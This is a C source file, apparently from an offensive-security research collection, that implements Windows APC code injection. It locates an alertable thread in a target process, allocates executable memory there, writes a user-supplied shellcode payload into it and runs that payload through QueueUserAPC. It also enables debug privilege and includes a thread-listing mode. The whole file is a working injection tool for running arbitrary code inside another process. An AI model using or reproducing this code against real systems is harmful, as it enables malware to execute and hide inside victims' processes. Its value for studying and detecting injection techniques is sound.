/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../ntlib/util.h"

// Try to find thread in alertable state for opened process.
// This is based on code used in AtomBombing technique.
//
// https://github.com/BreakingMalwareResearch/atom-bombing
//
HANDLE find_alertable_thread1(HANDLE hp, DWORD pid) {
    DWORD         i, cnt = 0;
    HANDLE        evt[2], ss, ht, h = NULL, 
      hl[MAXIMUM_WAIT_OBJECTS],
      sh[MAXIMUM_WAIT_OBJECTS],
      th[MAXIMUM_WAIT_OBJECTS];
    THREADENTRY32 te;
    HMODULE       m;
    LPVOID        f, rm;
    
    // 1. Enumerate threads in target process
    ss = CreateToolhelp32Snapshot(
      TH32CS_SNAPTHREAD, 0);
      
    if(ss == INVALID_HANDLE_VALUE) return NULL;

    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        // otherwise, add to list
        hl[cnt++] = ht;
        // if we've reached MAXIMUM_WAIT_OBJECTS. break
        if(cnt == MAXIMUM_WAIT_OBJECTS) break;
      } while(Thread32Next(ss, &te));
    }

    // Resolve address of SetEvent
    m  = GetModuleHandle(L"kernel32.dll");
    f  = GetProcAddress(m, "SetEvent");
    
    for(i=0; i<cnt; i++) {
      // 2. create event and duplicate in target process
      sh[i] = CreateEvent(NULL, FALSE, FALSE, NULL);
      
      DuplicateHandle(
        GetCurrentProcess(),  // source process
        sh[i],                // source handle to duplicate
        hp,                   // target process
        &th[i],               // target handle
        0, 
        FALSE, 
        DUPLICATE_SAME_ACCESS);
        
      // 3. Queue APC for thread passing target event handle
      QueueUserAPC(f, hl[i], (ULONG_PTR)th[i]);
    }

    // 4. Wait for event to become signalled
    i = WaitForMultipleObjects(cnt, sh, FALSE, 1000);
    if(i != WAIT_TIMEOUT) {
      // 5. save thread handle
      h = hl[i];
    }
    
    // 6. Close source + target handles
    for(i=0; i<cnt; i++) {
      CloseHandle(sh[i]);
      CloseHandle(th[i]);
      if(hl[i] != h) CloseHandle(hl[i]);
    }
    CloseHandle(ss);
    return h;
}

BOOL IsAlertable(HANDLE hp, HANDLE ht, LPVOID addr[6]) {
    CONTEXT   c;
    BOOL      alertable = FALSE;
    DWORD     i;
    ULONG_PTR p[8];
    SIZE_T    rd;
    
    // read the context
    c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    GetThreadContext(ht, &c);
    
    // for each alertable function
    for(i=0; i<6 && !alertable; i++) {
      // compare address with program counter
      if((LPVOID)c.Rip == addr[i]) {
        switch(i) {
          // ZwDelayExecution
          case 0 : {
            alertable = (c.Rcx & TRUE);
            break;
          }
          // NtWaitForSingleObject
          case 1 : {
            alertable = (c.Rdx & TRUE);
            break;
          }
          // NtWaitForMultipleObjects
          case 2 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtSignalAndWaitForSingleObject
          case 3 : {
            alertable = (c.Rsi & TRUE);
            break;
          }
          // NtUserMsgWaitForMultipleObjectsEx
          case 4 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[5] & MWMO_ALERTABLE);
            break;
          }
          // NtRemoveIoCompletionEx
          case 5 : {
            ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
            alertable = (p[6] & TRUE);
            break;
          }            
        }
      }
    }
    return alertable;
}
 
// based on idea suggested in :
// https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All.pdf
 
// thread to run alertable functions
DWORD WINAPI ThreadProc(LPVOID lpParameter) {
    HANDLE           *evt = (HANDLE)lpParameter;
    HANDLE           port;
    OVERLAPPED_ENTRY lap;
    DWORD            n;
    
    SleepEx(INFINITE, TRUE);
    
    WaitForSingleObjectEx(evt[0], INFINITE, TRUE);
    
    WaitForMultipleObjectsEx(2, evt, FALSE, INFINITE, TRUE);
    
    SignalObjectAndWait(evt[1], evt[0], INFINITE, TRUE);
    
    ResetEvent(evt[0]);
    ResetEvent(evt[1]);
    
    MsgWaitForMultipleObjectsEx(2, evt, 
      INFINITE, QS_RAWINPUT, MWMO_ALERTABLE);
      
    port = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0);
    GetQueuedCompletionStatusEx(port, &lap, 1, &n, INFINITE, TRUE);
    CloseHandle(port);
    
    return 0;
}

HANDLE find_alertable_thread2(HANDLE hp, DWORD pid) {
    HANDLE        ss, ht, evt[2], h = NULL;
    LPVOID        rm, sevt, f[6];
    THREADENTRY32 te;
    SIZE_T        rd;
    DWORD         i;
    CONTEXT       c;
    ULONG_PTR     p;
    HMODULE       m;
    
    // using the offset requires less code but it may
    // not work across all systems.
#ifdef USE_OFFSET
    char *api[6]={
      "ZwDelayExecution", 
      "ZwWaitForSingleObject",
      "NtWaitForMultipleObjects",
      "NtSignalAndWaitForSingleObject",
      "NtUserMsgWaitForMultipleObjectsEx",
      "NtRemoveIoCompletionEx"};
      
    // 1. Resolve address of alertable functions
    for(i=0; i<6; i++) {
      m = GetModuleHandle(i == 4 ? L"win32u" : L"ntdll");
      f[i] = (LPBYTE)GetProcAddress(m, api[i]) + 0x14;
    }
#else
    // create thread to execute alertable functions
    evt[0] = CreateEvent(NULL, FALSE, FALSE, NULL);
    evt[1] = CreateEvent(NULL, FALSE, FALSE, NULL);
    ht     = CreateThread(NULL, 0, ThreadProc, evt, 0, NULL);
    
    // wait a moment for thread to initialize
    Sleep(100);
    
    // resolve address of SetEvent
    m      = GetModuleHandle(L"kernel32.dll");
    sevt   = GetProcAddress(m, "SetEvent");
    
    // for each alertable function
    for(i=0; i<6; i++) {
      // read the thread context
      c.ContextFlags = CONTEXT_CONTROL;
      GetThreadContext(ht, &c);
      // save address
      f[i] = (LPVOID)c.Rip;
      // queue SetEvent for next function
      QueueUserAPC(sevt, ht, (ULONG_PTR)evt);
    }
    // cleanup thread
    CloseHandle(ht);
    CloseHandle(evt[0]);
    CloseHandle(evt[1]);
#endif

    // Create a snapshot of threads
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    // check each thread
    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        
        // found alertable thread?
        if(IsAlertable(hp, ht, f)) {
          // save handle and exit loop
          h = ht;
          break;
        }
        // else close it and continue
        CloseHandle(ht);
      } while(Thread32Next(ss, &te));
    }
    // close snap shot
    CloseHandle(ss);
    return h;
}

VOID apc_inject(DWORD pid, LPVOID payload, DWORD payloadSize) {
    HANDLE hp, ht;
    SIZE_T wr;
    LPVOID cs;
    
    // 1. Open target process
    hp = OpenProcess(
      PROCESS_DUP_HANDLE | 
      PROCESS_VM_READ    | 
      PROCESS_VM_WRITE   | 
      PROCESS_VM_OPERATION, 
      FALSE, pid);
      
    if(hp == NULL) {
      printf("unable to open process.\n");
      return;
    }
    // 2. Find an alertable thread
    ht = find_alertable_thread2(hp, pid);

    if(ht != NULL) {
      // 3. Allocate memory
      cs = VirtualAllocEx(
        hp, 
        NULL, 
        payloadSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE);
        
      if(cs != NULL) {
        // 4. Write code to memory
        if(WriteProcessMemory(
          hp, 
          cs, 
          payload, 
          payloadSize, 
          &wr)) 
        {
          // 5. Run code
          QueueUserAPC(cs, ht, 0);
        } else {
          printf("unable to write payload to process.\n");
        }
        // 6. Free memory
        VirtualFreeEx(
          hp, 
          cs, 
          0, 
           MEM_RELEASE);
      } else {
        printf("unable to allocate memory.\n");
      }
    } else {
      printf("unable to find alertable thread.\n");
    }
    // 7. Close process
    CloseHandle(hp);
}

VOID list_threads(DWORD pid) {
    DWORD         i;
    HANDLE        ss, ht, hp;
    THREADENTRY32 te;
    HMODULE       m;
    LPVOID        f[6], rm;
    SIZE_T        rd;
    LPVOID        p[8];
    CONTEXT       c;
 
    char *api[6]={
      "ZwDelayExecution", 
      "ZwWaitForSingleObject",
      "NtWaitForMultipleObjects",
      "NtSignalAndWaitForSingleObject",
      "NtUserMsgWaitForMultipleObjectsEx",
      "NtRemoveIoCompletionEx"};
      
    hp = OpenProcess(
      PROCESS_DUP_HANDLE | 
      PROCESS_VM_READ    | 
      PROCESS_VM_WRITE   | 
      PROCESS_VM_OPERATION, 
      FALSE, pid);
      
    if(hp == NULL) return;
    
    // 1. Resolve address of alertable system calls
    for(i=0; i<6; i++) {
      m = GetModuleHandle(i == 4 ? L"win32u" : L"ntdll");
      f[i] = (LPBYTE)GetProcAddress(m, api[i]) + 0x14;
    }
    // 2. Create a snapshot of threads
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if(ss == INVALID_HANDLE_VALUE) return;
    
    // 3. Gather list of threads for target process
    te.dwSize = sizeof(THREADENTRY32);
    
    if(Thread32First(ss, &te)) {
      do {
        // if not our target process, skip it
        if(te.th32OwnerProcessID != pid) continue;
        
        // if we can't open thread, skip it
        ht = OpenThread(
          THREAD_ALL_ACCESS, 
          FALSE, 
          te.th32ThreadID);
          
        if(ht == NULL) continue;
        
        // suspend thread and obtain the context
        ZeroMemory(&c, sizeof(c));
        c.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
        GetThreadContext(ht, &c);
        
        // for each alertable function, compare with the value of Rip register
        for(i=0; i<6; i++) {
          // if we have match
          if((LPVOID)c.Rip == f[i]) {
            switch(i) {
              // ZwDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
              case 0 : {
                printf("%s(Alertable=%s, DelayInterval=%p)\n", 
                  api[i], (c.Rcx & TRUE) ? "TRUE" : "FALSE", (LPVOID)c.Rdx);
                break;
              }
              // ZwWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
              case 1 : {
                printf("%s(Handle=%p, Alertable=%s, Timeout=%p)\n", 
                  api[i], (LPVOID)c.Rcx, (c.Rdx & TRUE) ? "TRUE" : "FALSE", (LPVOID)c.R8);
                break;
              }
              // NtWaitForMultipleObjects(ULONG ObjectCount, PHANDLE ObjectsArray, 
              //        OBJECT_WAIT_TYPE WaitType, DWORD Timeout, BOOLEAN Alertable, PLARGE_INTEGER Timeout); 
              case 2 : {
                // as with signal and wait, R9 is overwritten by the kernel. the value is saved in RSI
                // in event system call returns for any reason other than STATUS_ALERTED
                ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
                printf("%s(ObjectCount=%lli, ObjectsArray=%p, WaitType=%s, Alertable=%s, Timeout=%p)\n", 
                  api[i], c.Rcx, (LPVOID)c.Rdx, 
                  (c.R8  & TRUE) ? "TRUE" : "FALSE", 
                  (c.Rsi & TRUE) ? "TRUE" : "FALSE", p[5]);
                break;
              }
              // NtSignalAndWaitForSingleObject(HANDLE SignalHandle, HANDLE WaitHandle, 
              //        BOOLEAN Alertable, PLARGE_INTEGER Timeout);
              case 3 : {
                // we can check RSI for TRUE or FALSE, but the use of this register might change in future, so it's unreliable
                // It seems that R8 is overwritten by the kernel. Rsi is still okay though.
                printf("%s(ObjectToSignal=%p, WaitableObject=%p, Alertable=%s, Timeout=%p)\n", 
                  api[i], (LPVOID)c.Rcx, (LPVOID)c.Rdx, (c.Rsi & TRUE) ? "TRUE" : "FALSE", (LPVOID)c.R9);
                break;
              }
              // NtUserMsgWaitForMultipleObjectsEx(ULONG ObjectCount, PHANDLE ObjectsArray, 
              //        DWORD Timeout, DWORD WakeMask, DWORD Flags);
              case 4 : {
                ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
                printf("%s(ObjectCount=%i, ObjectsArray=%p, Timeout=%lx, WakeMask=%lx, Alertable=%s)\n", 
                  api[i], (DWORD)c.Rcx, (LPVOID)c.Rdx, (DWORD)c.R8, (DWORD)c.R9, 
                  ((DWORD)p[5] & MWMO_ALERTABLE) ? "TRUE" : "FALSE");
                break;
              }
              // NtRemoveIoCompletionEx(HANDLE Port, FILE_IO_COMPLETION_INFORMATION *Info, ULONG Count,
              //        ULONG *Written, LARGE_INTEGER *Timeout, BOOLEAN alertable);
              case 5 : {
                ReadProcessMemory(hp, (LPVOID)c.Rsp, p, sizeof(p), &rd);
                printf("%s(port=%lx, info=%p, count=%i, written=%p, timeout=%p, Alertable=%s)\n", 
                  api[i], (DWORD)c.Rcx, (LPVOID)c.Rdx, (DWORD)c.R8, (LPVOID)c.R9, 
                  p[5], ((DWORD)p[6] & TRUE) ? "TRUE" : "FALSE");
                break;
              }
            }
          }
        }
        CloseHandle(ht);
      } while(Thread32Next(ss, &te));
    }
    CloseHandle(ss);
    CloseHandle(hp);
}

int main(void) {
    LPVOID  pic;
    DWORD   len, pid;
    int     argc;
    wchar_t **argv;
    
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if(argc < 2) {
      printf("\nusage: apc_inject <process> <payload.bin>\n");
      return 0;
    }

    pid = name2pid(argv[1]);
    
    if(pid == 0) pid = wcstoull(argv[1], NULL, 10);
    if(pid == 0) { 
      printf("unable to obtain process id for %ws\n", argv[1]);
      return 0;
    }
    
    SetPrivilege(SE_DEBUG_NAME, TRUE);
    
    if(argc == 3) {
      len = readpic(argv[2], &pic);
      if (len == 0) { printf("\ninvalid payload\n"); return 0;}
      apc_inject(pid, pic, len);
    } else {
      list_threads(pid);
    }
    
    return 0;
}

